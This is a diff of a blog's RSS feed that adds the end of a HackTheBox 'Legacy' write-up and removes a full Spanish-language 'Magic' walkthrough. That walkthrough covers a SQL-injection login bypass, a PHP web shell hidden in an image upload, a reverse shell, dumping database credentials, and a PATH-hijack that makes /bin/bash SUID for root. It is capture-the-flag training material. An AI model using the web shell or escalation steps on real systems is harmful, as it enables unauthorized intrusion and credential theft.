+&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;❯ ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.4.
+Ncat: Connection from 10.10.10.4:1047.
+Microsoft Windows XP [Version 5.1.2600]
+(C) Copyright 1985-2001 Microsoft Corp.
+
+C:\WINDOWS\system32&amp;gt; cd &quot;Documents and Settings&quot;
+cd &quot;Documents and Settings&quot;
+
+C:\Documents and Settings&amp;gt;dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 54BF-723B
+
+ Directory of C:\Documents and Settings
+
+16/03/2017  09:07     &amp;lt;DIR&amp;gt;          .
+16/03/2017  09:07     &amp;lt;DIR&amp;gt;          ..
+16/03/2017  09:07     &amp;lt;DIR&amp;gt;          Administrator
+16/03/2017  08:29     &amp;lt;DIR&amp;gt;          All Users
+16/03/2017  08:33     &amp;lt;DIR&amp;gt;          john
+               0 File(s)              0 bytes
+               5 Dir(s)   6.403.846.144 bytes free
+
+C:\Documents and Settings&amp;gt;cd Administrator\Desktop
+cd Administrator\Desktop
+
+C:\Documents and Settings\Administrator\Desktop&amp;gt;type root.txt
+type root.txt
+993442d258b0e0ec917cae9e695d5713
+C:\Documents and Settings\Administrator\Desktop&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+</description>
+        <pubDate>Thu, 29 Jun 2023 00:00:00 +0000</pubDate>
+        <link>http://localhost:4000/hackthebox/htb-writeup-Legacy</link>
+        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Legacy</guid>
+        
+        <category>SMB Enumeration</category>
+        
+        <category>Eternal Blue explotation</category>
+        
+        <category>(MS17-010)</category>
+        
+        <category>(MS08-067)</category>
+        
+        
+        <category>hackthebox</category>
+        
+      </item>
     
       <item>
         <title>Maquina Valentine - htb writeup</title>
@@ -5495,1069 +6462,6 @@ Info: Establishing connection to remote endpoint
         <category>absing PRTG Network Monitor</category>
         
         <category>Command Injection RCE</category>
-        
-        
-        <category>hackthebox</category>
-        
-      </item>
-    
-      <item>
-        <title>Maquina Magic - htb writeup</title>
-        <description>&lt;p&gt;En esta ocasión vamos a resolver la máquina &lt;code&gt;Magic&lt;/code&gt; de la plataforma de &lt;code&gt;hackthebox&lt;/code&gt; correspondiente a una &lt;code&gt;linux&lt;/code&gt; dificultad media, la cual explotaremos evadiendo el panel de logeo mediante una inyeccion simple en sql, despues aprovecharemos de una mala sanizitación de subida de archivos derivandola en una ejecución remota de comandos; una vez dentro del sistema obtendremos credenciales enumerando la base de datos y finamente aprocecharemos el permiso &lt;code&gt;suid&lt;/code&gt; de un binario, para ejecutar una &lt;code&gt;path hijacking&lt;/code&gt; que nos dara acceso como el usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Vamos a comenzar creando un directorio con el nombre de la maquina:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Magic
-❯ ls
- Magic
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
-mkt () {
-	mkdir {nmap,content,exploits,scripts}
-}
-❯ mkt
-❯ ls
- content   exploits   nmap   scripts
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeración &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.185
-PING 10.10.10.185 (10.10.10.185) 56(84) bytes of data.
-64 bytes from 10.10.10.185: icmp_seq=1 ttl=63 time=137 ms
-
---- 10.10.10.185 ping statistics ---
-1 packets transmitted, 1 received, 0% packet loss, time 0ms
-rtt min/avg/max/mdev = 137.232/137.232/137.232/0.000 ms
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Vemos que la maquina nos responde, ahora procederemos a el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;
-
-&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Parámetro&lt;/th&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.185 -oG openPorts
-Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
-Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-13 21:00 GMT
-Initiating SYN Stealth Scan at 21:00
-Scanning 10.10.10.185 [65535 ports]
-Discovered open port 80/tcp on 10.10.10.185
-Discovered open port 22/tcp on 10.10.10.185
-Completed SYN Stealth Scan at 21:00, 16.68s elapsed (65535 total ports)
-Nmap scan report for 10.10.10.185
-Host is up, received user-set (0.12s latency).
-Scanned at 2023-06-13 21:00:26 GMT for 17s
-Not shown: 65533 closed tcp ports (reset)
-PORT   STATE SERVICE REASON
-22/tcp open  ssh     syn-ack ttl 63
-80/tcp open  http    syn-ack ttl 63
-
-Read data files from: /usr/bin/../share/nmap
-Nmap done: 1 IP address (1 host up) scanned in 16.83 seconds
-           Raw packets sent: 82274 (3.620MB) | Rcvd: 81681 (3.267MB)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Podemos ver que los puertos que se encuentran abiertos son el puerto &lt;code&gt;22 ssh&lt;/code&gt; y el &lt;code&gt;80 http&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,80 10.10.10.185 -oN targeted
-Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-13 21:01 GMT
-Nmap scan report for 10.10.10.185
-Host is up (0.20s latency).
-
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca (RSA)
-|   256 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 (ECDSA)
-|_  256 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 (ED25519)
-80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-|_http-server-header: Apache/2.4.29 (Ubuntu)
-|_http-title: Magic Portfolio
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 20.34 seconds
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Visulizamos informacion interesante de los puertos escaneados:&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Puerto&lt;/th&gt;
-      &lt;th&gt;Servicio&lt;/th&gt;
-      &lt;th&gt;Versión&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;22&lt;/td&gt;
-      &lt;td&gt;SSH&lt;/td&gt;
-      &lt;td&gt;OpenSSH 7.6p1 Ubuntu 4ubuntu0.3&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;80&lt;/td&gt;
-      &lt;td&gt;HTTP&lt;/td&gt;
-      &lt;td&gt;Apache httpd 2.4.29&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;Seguidamente vamos a usar la herramienta &lt;code&gt;whatweb&lt;/code&gt; para ver por consola el gestor de contenido de la pagina web.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;❯ whatweb http://10.10.10.185
-http://10.10.10.185 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.185], JQuery, Script, Title[Magic Portfolio]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Vamos seguidamente a abrir la web en nuestro navegador.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Observamos una que la pagina se compone de una serie de imagenes y tambien podemos ver que existe un enlace a un login que procederemos a visitar.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Para tratar de averiguar la ruta donde sube las imagenes, podemos usar el inspeccionador de elementos y mostrar la ruta de donde cargan las imagenes que corresponde a &lt;code&gt;/uploads&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Probamos a tratar de logearnos con credenciales por defecto pero nos resulta imposible. Como estamos frente a un panel de logeo, podemos tratar de ocasionar un error en los inputs mediante una &lt;code&gt;sql injection&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Como resultado podemos logramos logearnos exitosamente y nos redirige a un panel donde podemos subir una imagen. Para ver si bien sanitizada la subida de archivos, probaremos con subir un archivo de nombre &lt;code&gt;cmd.php&lt;/code&gt; que mediante el uso de etiquetas preformateadas y haciendo uso de la función &lt;code&gt;shell_exec&lt;/code&gt; con el parametro &lt;code&gt;cmd&lt;/code&gt; ejecutar comandos.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;&amp;lt;?php
-  echo &quot;&amp;lt;pre&amp;gt;&quot; . shell_exec($_REQUEST['cmd']) . &quot;&amp;lt;/pre&amp;gt;&quot;;
-?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Procedemos a subir el archivo pero vemos que solo admite formatos de imagen.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Podemos probar a renombrar nuestro archivo &lt;code&gt;cmd.php&lt;/code&gt; y asignarle una doble extensión para asi tratar de bypasear la subida.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vemos que esta vez cambie el mensaje de error, y detecta que estamos tratando de manipular la subida.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic9.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Debemos de tener en cuenta que en base a los &lt;code&gt;magic numbers&lt;/code&gt; que son los primeros bytes de los archivos se validan los tipos de archivos en este caso si con el comando &lt;code&gt;file&lt;/code&gt; tratamos de validar nuestro archivo &lt;code&gt;cmd.php.png&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ file cmd.php.png
-cmd.php.png: PHP script, ASCII text
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Nos detecta que es un &lt;code&gt;php script&lt;/code&gt;, pero si agregamos la cabezera &lt;code&gt;GIF8;&lt;/code&gt; al inicio de nuestro archivo ahora nos lo detectara como &lt;code&gt;gif image&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-php&quot;&gt;❯ file cmd.php.png
-cmd.php.png: GIF image data 16188 x 26736
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Probaremos a subir nuevamente el archivo modificado.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic10.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Obtenemos el mismo error, asi que esta vez vamos a descargar una imagen cualquier de &lt;code&gt;google&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic11.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora vamos a alterar su contenido añadiendo una intrucción en &lt;code&gt;php&lt;/code&gt; y añadiendo la extensión &lt;code&gt;.php&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic12.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Subimos nuevamente el archivo y esta vez nos lo hace correctamente.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic13.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic14.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vamos a la ruta donde se suben las imagenes que la obtuvimos previamente y efectivamente podemos ver nuestro archivo, aunque en un formato no legible por ser binario.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic15.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Validamos si podemos ejecutar comandos gracias a la instrucción php que añadimos y tenemos ejecución de comandos.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Magic/magic16.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora con bash vamos a enviarnos una reverse shell, para ello nos pondremos en escucha con &lt;code&gt;ncat&lt;/code&gt; en el puerto &lt;code&gt;443&lt;/code&gt; y obtenemos acceso como el usuario &lt;code&gt;www-data&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ncat -nlvp 443
-Ncat: Version 7.92 ( https://nmap.org/ncat )
-Ncat: Listening on :::443
-Ncat: Listening on 0.0.0.0:443
-Ncat: Connection from 10.10.10.185.
-Ncat: Connection from 10.10.10.185:51270.
-bash: cannot set terminal process group (1136): Inappropriate ioctl for device
-bash: no job control in this shell
-www-data@ubuntu:/var/www/Magic/images/uploads$ whoami
-whoami
-www-data
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora como de costumbre vamos a otorgarnos una &lt;code&gt;tty full interactiva&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@ubuntu:/var/www/Magic/images/uploads$ script /dev/null -c bash
-script /dev/null -c bash
-Script started, file is /dev/null
-www-data@ubuntu:/var/www/Magic/images/uploads$ ^Z
-zsh: suspended  ncat -nlvp 443
-❯ stty raw -echo; fg
-[1]  + continued  ncat -nlvp 443
-                                reset xterm
-www-data@ubuntu:/var/www/Magic/images/uploads$ export TERM=xterm
-www-data@ubuntu:/var/www/Magic/images/uploads$ export SHELL=bash 
-www-data@ubuntu:/var/www/Magic/images/uploads$ stty rows 45 columns 184
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Si volvemos al directorio &lt;code&gt;Magic&lt;/code&gt;, encontraremos un archivo &lt;code&gt;db.php5&lt;/code&gt; el cual contiene unas credenciales.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@ubuntu:/var/www/Magic$ ls
-assets	db.php5  images  index.php  login.php  logout.php  upload.php
-www-data@ubuntu:/var/www/Magic$ cat db.php5 
-&amp;lt;?php
-class Database
-{
-    private static $dbName = 'Magic' ;
-    private static $dbHost = 'localhost' ;
-    private static $dbUsername = 'theseus';
-    private static $dbUserPassword = 'iamkingtheseus';
-
-    private static $cont  = null;
-
-    public function __construct() {
-        die('Init function is not allowed');
-    }
-
-    public static function connect()
-    {
-        // One connection through whole application
-        if ( null == self::$cont )
-        {
-            try
-            {
-                self::$cont =  new PDO( &quot;mysql:host=&quot;.self::$dbHost.&quot;;&quot;.&quot;dbname=&quot;.self::$dbName, self::$dbUsername, self::$dbUserPassword);
-            }
-            catch(PDOException $e)
-            {
-                die($e-&amp;gt;getMessage());
-            }
-        }
-        return self::$cont;
-    }
-
-    public static function disconnect()
-    {
-        self::$cont = null;
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Si tratamos de usar las credenciales para conectarnos como &lt;code&gt;theseus&lt;/code&gt;, vemos que no corresponde, pero podemos tratar de conectarnos a la base de datos. Y al no existir &lt;code&gt;mysql&lt;/code&gt;, podemos usar &lt;code&gt;mysqlshow&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@ubuntu:/var/www/Magic$ su theseus
-Password: 
-su: Authentication failure
-www-data@ubuntu:/var/www/Magic$ mysqlshow -utheseus -piamkingtheseus
-mysqlshow: [Warning] Using a password on the command line interface can be insecure.
-+--------------------+
-|     Databases      |
-+--------------------+
-| information_schema |
-| Magic              |
-+--------------------+
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Podemos enumerar las bases de datos utilizadas, y ahora usaremos &lt;code&gt;mysqldump&lt;/code&gt; para dumpear las datos  almancenados en la base de datos &lt;code&gt;Magic&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-sql&quot;&gt;www-data@ubuntu:/var/www/Magic$ mysqldump -utheseus -piamkingtheseus Magic
-mysqldump: [Warning] Using a password on the command line interface can be insecure.
--- MySQL dump 10.13  Distrib 5.7.29, for Linux (x86_64)
---
--- Host: localhost    Database: Magic
--- ------------------------------------------------------
--- Server version	5.7.29-0ubuntu0.18.04.1
-
-/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
-/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
-/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
-/*!40101 SET NAMES utf8 */;
-/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
-/*!40103 SET TIME_ZONE='+00:00' */;
-/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
-/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
-/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
-/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
-
---
--- Table structure for table `login`
---
-
-DROP TABLE IF EXISTS `login`;
-/*!40101 SET @saved_cs_client     = @@character_set_client */;
-/*!40101 SET character_set_client = utf8 */;
-CREATE TABLE `login` (
-  `id` int(6) NOT NULL AUTO_INCREMENT,
-  `username` varchar(50) NOT NULL,
-  `password` varchar(100) NOT NULL,
-  PRIMARY KEY (`id`),
-  UNIQUE KEY `username` (`username`)
-) ENGINE=InnoDB AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;
-/*!40101 SET character_set_client = @saved_cs_client */;
-
---
--- Dumping data for table `login`
---
-
-LOCK TABLES `login` WRITE;
-/*!40000 ALTER TABLE `login` DISABLE KEYS */;
-INSERT INTO `login` VALUES (1,'admin','Th3s3usW4sK1ng');
-/*!40000 ALTER TABLE `login` ENABLE KEYS */;
-UNLOCK TABLES;
-/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
-
-/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
-/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
-/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
-/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
-/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
-/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
-/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
-
--- Dump completed on 2023-06-13 15:00:33
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Obtenemos unas credenciales correspondientes al usuario &lt;code&gt;theseus&lt;/code&gt;, ahora podemos migrar al usuario, dirigirnos al directorio del usuario y visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;www-data@ubuntu:/var/www/Magic$ su theseus
-Password: 
-theseus@ubuntu:/var/www/Magic$ whoami
-theseus
-theseus@ubuntu:/var/www/Magic$ cd /home/theseus/
-theseus@ubuntu:~$ cat user.txt 
-fb197a83208d0d99ecdbed4ee83fc4f0
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Listamos los archivos con privilegios &lt;code&gt;suid&lt;/code&gt;, vemos uno inusual &lt;code&gt;/bin/sysinfo&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;theseus@ubuntu:~$ find / -perm -4000 2&amp;gt;/dev/null | grep -v &quot;snap&quot;
-/usr/sbin/pppd
-/usr/bin/newgrp
-/usr/bin/passwd
-/usr/bin/chfn
-/usr/bin/gpasswd
-/usr/bin/sudo
-/usr/bin/pkexec
-/usr/bin/chsh
-/usr/bin/traceroute6.iputils
-/usr/bin/arping
-/usr/bin/vmware-user-suid-wrapper
-/usr/lib/openssh/ssh-keysign
-/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-/usr/lib/policykit-1/polkit-agent-helper-1
-/usr/lib/eject/dmcrypt-get-device
-/usr/lib/xorg/Xorg.wrap
-/bin/umount
-/bin/fusermount
-/bin/sysinfo
-/bin/mount
-/bin/su
-/bin/ping
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Si vemos los caracteres imprimibles del binario con la ayuda de &lt;code&gt;strings&lt;/code&gt;, podemos ver que hace uso del comando &lt;code&gt;fdisk&lt;/code&gt;, de manera relativa.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;theseus@ubuntu:~$ strings /bin/sysinfo
-/lib64/ld-linux-x86-64.so.2
-libstdc++.so.6
-__gmon_start__
-_ITM_deregisterTMCloneTable
-====================Hardware Info====================
-lshw -short
-====================Disk Info====================
-fdisk -l
-====================CPU Info====================
-cat /proc/cpuinfo
-====================MEM Usage=====================
-free -h
-;*3$&quot;
-zPLR
-GCC: (Ubuntu 7.4.0-1ubuntu1~18.04.1) 7.4.0
-crtstuff.c
-deregister_tm_clones
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Lo que haremos ahora sera efectuar un &lt;code&gt;path hijacking&lt;/code&gt;, donde alteraremos la ruta de nuestro &lt;code&gt;path&lt;/code&gt; y crearemos un archivo de nombre &lt;code&gt;fdisk&lt;/code&gt; donde le otorgaremos el privilegio &lt;code&gt;suid a la bash&lt;/code&gt;, de modo tal que al ejecutar &lt;code&gt;/bin/sysinfo&lt;/code&gt; hara uso del comando &lt;code&gt;fdisk&lt;/code&gt; y al haber manipulado nuestro &lt;code&gt;path&lt;/code&gt; lo hara desde la ruta actual que especifiquemos donde tendremos nuestro archivo creado, esto debido a que &lt;code&gt;fdisk&lt;/code&gt; no se esta aplicando de manera absoluta.&lt;/p&gt;
-
-&lt;p&gt;Te dejo el siguiente articulo para que veas mas a fondo esta vulnerabilidad.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://deephacking.tech/path-hijacking-y-library-hijacking/#path-hijacking&quot;&gt;https://deephacking.tech/path-hijacking-y-library-hijacking/#path-hijacking&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Procedemos a crearnos el archivo en la ruta &lt;code&gt;/tmp&lt;/code&gt;, que generalamente es donde se tiene permiso de escritura y le damos permiso de ejecución.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;theseus@ubuntu:/tmp$ cat fdisk 
-#!/bin/bash
-
-chmod u+s /bin/bash
-theseus@ubuntu:/tmp$ chmod +x fdisk
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora manilupalaremos nuestro &lt;code&gt;path&lt;/code&gt; para que este tire desde la ruta &lt;code&gt;/tmp&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;theseus@ubuntu:/tmp$ echo $PATH
-/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
-theseus@ubuntu:/tmp$ export PATH=/tmp:$PATH
-theseus@ubuntu:/tmp$ echo $PATH
-/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ejecutamos el &lt;code&gt;/bin/sysinfo&lt;/code&gt; y vemos el privilegios de la &lt;code&gt;/bin/bash&lt;/code&gt; fue asignado correctamente.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;theseus@ubuntu:/tmp$ /bin/sysinfo
-====================Hardware Info====================
-H/W path           Device     Class      Description
-====================================================
-                              system     VMware Virtual Platform
-/0                            bus        440BX Desktop Reference Platform
-
-theseus@ubuntu:/tmp$ ls -l /bin/bash
--rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora solo debemos ejecutar el comando &lt;code&gt;bash -p&lt;/code&gt; y estariamos como el usuario &lt;code&gt;root&lt;/code&gt;, seguidamente podemos dirigirnos al directorio del usuario &lt;code&gt;root&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;theseus@ubuntu:/tmp$ bash -p
-bash-4.4# whoami
-root
